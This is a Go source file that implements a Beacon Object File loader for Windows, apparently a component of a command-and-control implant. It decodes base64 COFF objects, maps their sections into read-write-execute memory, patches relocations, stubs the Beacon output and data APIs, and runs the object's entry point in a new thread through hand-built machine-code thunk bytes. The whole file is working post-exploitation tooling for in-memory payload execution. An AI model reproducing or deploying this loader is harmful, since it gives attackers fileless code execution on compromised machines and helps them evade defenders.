package main

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── COFF Structures (AMD64) ─────────────────────────────────────────────────

const (
	COFF_MACHINE_AMD64_WS = 0x8664
	IMAGE_REL_AMD64_ADDR64_WS = 0x0001
	IMAGE_REL_AMD64_ADDR32_WS = 0x0002
	IMAGE_REL_AMD64_REL32_WS  = 0x0004
)

type coffHeaderWS struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type coffSectionHeaderWS struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type coffRelocationWS struct {
	VirtualAddress   uint32
	SymbolTableIndex uint32
	Type             uint16
}

type coffSymbolWS struct {
	Name               [8]byte
	Value              uint32
	SectionNumber      int16
	Type               uint16
	StorageClass       uint8
	NumberOfAuxSymbols uint8
}

// ─── Beacon Output State ────────────────────────────────────────────────────

var (
	bofOutputBuf   strings.Builder
	bofOutputMu    sync.Mutex
)

// ─── BOF Loader ─────────────────────────────────────────────────────────────

func loadBOFWS(dataB64 string, args string) (string, int32, string) {
	data, err := base64.StdEncoding.DecodeString(dataB64)
	if err != nil {
		return "", -1, fmt.Sprintf("BOF base64 decode failed: %v", err)
	}
	if len(data) < 20 {
		return "", -1, "BOF data too short"
	}

	r := &binReaderWS{data: data, pos: 0}

	// 1. Parse header
	hdr := coffHeaderWS{
		Machine:              r.u16(),
		NumberOfSections:     r.u16(),
		TimeDateStamp:        r.u32(),
		PointerToSymbolTable: r.u32(),
		NumberOfSymbols:      r.u32(),
		SizeOfOptionalHeader: r.u16(),
		Characteristics:      r.u16(),
	}
	if hdr.Machine != COFF_MACHINE_AMD64_WS {
		return "", -1, fmt.Sprintf("unsupported machine: 0x%x", hdr.Machine)
	}
	r.skip(int(hdr.SizeOfOptionalHeader))

	// 2. Parse sections
	sections := make([]coffSectionHeaderWS, hdr.NumberOfSections)
	sectionData := make([][]byte, hdr.NumberOfSections)
	for i := uint16(0); i < hdr.NumberOfSections; i++ {
		sh := coffSectionHeaderWS{}
		copy(sh.Name[:], r.bytes(8))
		sh.VirtualSize = r.u32()
		sh.VirtualAddress = r.u32()
		sh.SizeOfRawData = r.u32()
		sh.PointerToRawData = r.u32()
		sh.PointerToRelocations = r.u32()
		sh.PointerToLinenumbers = r.u32()
		sh.NumberOfRelocations = r.u16()
		sh.NumberOfLinenumbers = r.u16()
		sh.Characteristics = r.u32()
		sections[i] = sh
		if sh.SizeOfRawData > 0 && sh.PointerToRawData > 0 {
			sectionData[i] = data[sh.PointerToRawData : sh.PointerToRawData+sh.SizeOfRawData]
		} else if sh.VirtualSize > 0 {
			sectionData[i] = make([]byte, sh.VirtualSize)
		}
	}

	// 3. Parse symbols
	symbols, stringTable := parseSymbolsWS(data, int(hdr.PointerToSymbolTable), int(hdr.NumberOfSymbols))
	symbolNames := make([]string, len(symbols))
	for i, sym := range symbols {
		symbolNames[i] = getSymbolNameWS(sym, stringTable)
	}

	// 4. Allocate RWX memory for each section
	sectionBases := make([]uintptr, hdr.NumberOfSections)
	for i, sh := range sections {
		size := sh.SizeOfRawData
		if sh.VirtualSize > size {
			size = sh.VirtualSize
		}
		if size == 0 {
			size = 4096
		}
		base, err := windows.VirtualAlloc(0, uintptr(size), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
		if err != nil {
			cleanupSectionsWS(sectionBases[:i])
			return "", -1, fmt.Sprintf("VirtualAlloc section %d: %v", i, err)
		}
		sectionBases[i] = base
		if len(sectionData[i]) > 0 {
			dst := (*[1 << 30]byte)(unsafe.Pointer(base))
			copy(dst[:len(sectionData[i])], sectionData[i])
		}
	}

	// 5. Resolve externals
	externAddrs := resolveExternalsWS(symbols, symbolNames)

	// 6. Apply relocations
	for i, sh := range sections {
		if sh.NumberOfRelocations == 0 || sh.PointerToRelocations == 0 {
			continue
		}
		secBase := sectionBases[i]
		rp := int(sh.PointerToRelocations)
		for j := uint16(0); j < sh.NumberOfRelocations; j++ {
			if rp+10 > len(data) {
				break
			}
			reloc := coffRelocationWS{
				VirtualAddress:   binary.LittleEndian.Uint32(data[rp:]),
				SymbolTableIndex: binary.LittleEndian.Uint32(data[rp+4:]),
				Type:             binary.LittleEndian.Uint16(data[rp+8:]),
			}
			rp += 10

			patchAddr := secBase + uintptr(reloc.VirtualAddress)
			ti := int(reloc.SymbolTableIndex)
			if ti >= len(symbols) {
				continue
			}
			tsym := symbols[ti]
			var taddr uintptr
			if tsym.SectionNumber > 0 {
				taddr = sectionBases[tsym.SectionNumber-1] + uintptr(tsym.Value)
			} else if externAddrs[ti] != 0 {
				taddr = externAddrs[ti]
			} else {
				continue
			}

			switch reloc.Type {
			case IMAGE_REL_AMD64_ADDR64_WS:
				*(*uint64)(unsafe.Pointer(patchAddr)) += uint64(taddr)
			case IMAGE_REL_AMD64_ADDR32_WS:
				*(*uint32)(unsafe.Pointer(patchAddr)) += uint32(taddr)
			case IMAGE_REL_AMD64_REL32_WS:
				delta := int32(taddr - (patchAddr + 4))
				*(*int32)(unsafe.Pointer(patchAddr)) += delta
			}
		}
	}

	// 7. Find and call "go" entry
	var entry uintptr
	for i, sym := range symbols {
		if symbolNames[i] == "go" || symbolNames[i] == "_go" {
			if sym.SectionNumber > 0 && sym.SectionNumber <= int16(hdr.NumberOfSections) {
				entry = sectionBases[sym.SectionNumber-1] + uintptr(sym.Value)
				break
			}
		}
	}
	if entry == 0 {
		cleanupSectionsWS(sectionBases)
		return "", -1, "BOF has no 'go' entry point"
	}

	bofOutputBuf.Reset()
	bofOutputMu.Lock()
	defer bofOutputMu.Unlock()

	// Call go(args, len) with crash recovery.
	// Run BOF in a separate OS thread via CreateThread so that NewCallback
	// trampolines work correctly (they require a native thread context).
	var crashErr string
	func() {
		defer func() {
			if r := recover(); r != nil {
				crashErr = fmt.Sprintf("BOF execution panic: %v", r)
			}
		}()

		// Build args struct
		type bofArgsWS struct {
			buf uintptr
			sz  uintptr
		}
		var ba bofArgsWS
		var argsBuf []byte
		argLen := len(args)
		if argLen > 0 {
			argsBuf = append([]byte(args), 0)
			ba.buf = uintptr(unsafe.Pointer(&argsBuf[0]))
			ba.sz = uintptr(argLen)
		}

		// Create thunk: unpacks struct, calls BOF entry, returns
		thunkCode := []byte{
			0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28
			0x48, 0x8B, 0x51, 0x08, // mov rdx, [rcx+8]
			0x48, 0x8B, 0x09,       // mov rcx, [rcx]
			0x48, 0xB8,             // mov rax, <imm64>
		}
		epBytes := (*[8]byte)(unsafe.Pointer(&entry))
		thunkCode = append(thunkCode, epBytes[:]...)
		thunkCode = append(thunkCode,
			0xFF, 0xD0,             // call rax
			0x33, 0xC0,             // xor eax, eax
			0x48, 0x83, 0xC4, 0x28, // add rsp, 0x28
			0xC3,                   // ret
		)

		tAddr, err := windows.VirtualAlloc(0, uintptr(len(thunkCode)),
			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
		if err != nil {
			crashErr = fmt.Sprintf("VirtualAlloc thunk: %v", err)
			return
		}
		defer windows.VirtualFree(tAddr, 0, windows.MEM_RELEASE)
		copy((*[1 << 30]byte)(unsafe.Pointer(tAddr))[:len(thunkCode)], thunkCode)

		k32 := windows.NewLazySystemDLL("kernel32.dll")
		createThread := k32.NewProc("CreateThread")
		waitForObj := k32.NewProc("WaitForSingleObject")
		closeHandle := k32.NewProc("CloseHandle")

		th, _, _ := createThread.Call(0, 0, tAddr, uintptr(unsafe.Pointer(&ba)), 0, 0)
		if th == 0 {
			crashErr = "CreateThread failed"
			return
		}
		defer closeHandle.Call(th)
		waitForObj.Call(th, 0xFFFFFFFF)
		_ = argsBuf // keep alive until thread returns
	}()

	cleanupSectionsWS(sectionBases)

	if crashErr != "" {
		return "", -1, crashErr
	}

	out := bofOutputBuf.String()
	if out == "" {
		out = "BOF executed (no output)"
	}
	return out, 0, ""
}

// ─── BinReader ──────────────────────────────────────────────────────────────

type binReaderWS struct {
	data []byte
	pos  int
}

func (r *binReaderWS) u16() uint16 { v := binary.LittleEndian.Uint16(r.data[r.pos:]); r.pos += 2; return v }
func (r *binReaderWS) u32() uint32 { v := binary.LittleEndian.Uint32(r.data[r.pos:]); r.pos += 4; return v }
func (r *binReaderWS) bytes(n int) []byte { v := r.data[r.pos:r.pos+n]; r.pos += n; return v }
func (r *binReaderWS) skip(n int) { r.pos += n }

// ─── Symbol Parsing ─────────────────────────────────────────────────────────

func parseSymbolsWS(data []byte, offset, num int) ([]coffSymbolWS, []byte) {
	if offset == 0 || num == 0 {
		return nil, nil
	}
	// 保持 1:1 索引对应（辅助符号也占位）
	syms := make([]coffSymbolWS, num)
	pos := offset
	for i := 0; i < num; i++ {
		if pos+18 > len(data) {
			break
		}
		s := coffSymbolWS{}
		copy(s.Name[:], data[pos:pos+8])
		s.Value = binary.LittleEndian.Uint32(data[pos+8:])
		s.SectionNumber = int16(binary.LittleEndian.Uint16(data[pos+12:]))
		s.Type = binary.LittleEndian.Uint16(data[pos+14:])
		s.StorageClass = data[pos+16]
		s.NumberOfAuxSymbols = data[pos+17]
		syms[i] = s
		pos += 18
		for a := 0; a < int(s.NumberOfAuxSymbols); a++ {
			i++
			if i < num {
				syms[i] = coffSymbolWS{}
				pos += 18
			}
		}
	}
	return syms, data[pos:]
}

func getSymbolNameWS(sym coffSymbolWS, stringTable []byte) string {
	if sym.Name[0] != 0 {
		for i, c := range sym.Name {
			if c == 0 {
				return string(sym.Name[:i])
			}
		}
		return string(sym.Name[:])
	}
	if len(stringTable) > 4 {
		off := binary.LittleEndian.Uint32(sym.Name[4:8])
		for i := int(off); i < len(stringTable); i++ {
			if stringTable[i] == 0 {
				return string(stringTable[off:i])
			}
		}
	}
	return ""
}

// ─── External Resolution ───────────────────────────────────────────────────

var beaconAPIOutputWS = beaconAPIOuputCallback

func beaconAPIOuputCallback(outputType uintptr, data uintptr, length uintptr) uintptr {
	if data == 0 { return 0 }
	buf := make([]byte, length)
	for i := uintptr(0); i < length; i++ {
		buf[i] = *(*byte)(unsafe.Pointer(data + i))
	}
	bofOutputBuf.Write(buf)
	return 0
}

func resolveExternalsWS(symbols []coffSymbolWS, names []string) []uintptr {
	addrs := make([]uintptr, len(symbols))
	for i, sym := range symbols {
		if sym.SectionNumber != 0 || sym.Value != 0 {
			continue
		}
		fnName := strings.TrimPrefix(names[i], "__imp_")
		switch fnName {
		case "BeaconOutput":
			addrs[i] = syscall.NewCallback(beaconAPIOutputWS)
		case "BeaconPrintf":
			addrs[i] = syscall.NewCallback(beaconAPIOutputWS)
		case "BeaconDataParse", "BeaconDataInt", "BeaconDataShort", "BeaconDataLength", "BeaconDataExtract":
			addrs[i] = syscall.NewCallback(beaconStubWS)
		case "BeaconIsAdmin":
			addrs[i] = syscall.NewCallback(beaconIsAdminWS)
		default:
			addrs[i] = resolveWinAPIWS(fnName)
		}
	}
	return addrs
}

func beaconStubWS() uintptr { return 0 }

func beaconIsAdminWS() uintptr {
	var sid *windows.SID
	_ = windows.AllocateAndInitializeSid(&windows.SECURITY_NT_AUTHORITY, 2,
		windows.SECURITY_BUILTIN_DOMAIN_RID, windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0, &sid)
	if sid == nil { return 0 }
	defer windows.FreeSid(sid)
	var tok windows.Token
	_ = windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &tok)
	if tok == 0 { return 0 }
	defer tok.Close()
	var member int32
	modAdvapi32 := windows.NewLazySystemDLL("advapi32.dll")
	procCheckTokenMembership := modAdvapi32.NewProc("CheckTokenMembership")
	r1, _, _ := procCheckTokenMembership.Call(uintptr(tok), uintptr(unsafe.Pointer(sid)), uintptr(unsafe.Pointer(&member)))
	if r1 != 0 && member != 0 { return 1 }
	return 0
}

func resolveWinAPIWS(name string) uintptr {
	dlls := []string{"kernel32.dll", "ntdll.dll", "user32.dll", "advapi32.dll",
		"shell32.dll", "ws2_32.dll", "crypt32.dll", "winhttp.dll", "netapi32.dll",
		"ole32.dll", "oleaut32.dll", "msvcrt.dll"}
	for _, dll := range dlls {
		h, err := windows.LoadLibrary(dll)
		if err != nil { continue }
		p, err := windows.GetProcAddress(h, name)
		if err == nil && p != 0 { return p }
	}
	return 0
}

// ─── Cleanup ────────────────────────────────────────────────────────────────

func cleanupSectionsWS(bases []uintptr) {
	for _, b := range bases {
		if b != 0 { windows.VirtualFree(b, 0, windows.MEM_RELEASE) }
	}
}
